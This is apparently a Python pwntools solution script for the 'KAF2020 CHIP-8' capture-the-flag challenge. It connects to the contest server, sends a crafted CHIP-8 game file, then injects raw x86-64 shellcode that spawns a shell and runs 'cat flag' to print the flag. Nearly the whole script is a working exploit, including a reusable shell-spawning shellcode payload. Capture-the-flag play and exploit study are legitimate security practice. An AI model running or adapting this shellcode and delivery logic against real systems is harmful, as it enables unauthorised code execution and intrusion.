#!/usr/bin/env python3

from pwn import *
from time import sleep
from binascii import hexlify

# Some nops (push eax) to realign instructions
SHELLCODE = b"PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
context.binary = elf_addr  = "../KAF2020_CHIP_8_nodebug"

def int_recvuntil(p, values, timeout=5):
	"""Uses the regular recvuntil, except it drops to interactive if the timeout is exceeded"""
	res = p.recvuntil(values,timeout=timeout)
	if res == b"":
		log.failure(f"Dropping to interactive mode because I didn't receive '{values}'")
		p.interactive(prompt="")
	else:
		return res

def main():
	local = False
	if local:
		e = ELF(elf_addr, checksec=False)
		p = e.process()
	else:
		p = remote("chip8.ctf.kaf.sh", 1337)

	with open("./solve.ch8", "rb") as f:
		gamedata = f.read()

	p.sendline(hexlify(gamedata))
	sleep(1)
	p.sendline(SHELLCODE)
	sleep(0.5)
	p.sendline("cat flag")
	p.recvuntil("KAF")
	flag = "KAF" + p.recvline().decode()[:-1]
	log.success("Flag: " + pwnlib.term.text.bold_green(flag))

if __name__ == "__main__":
	main()
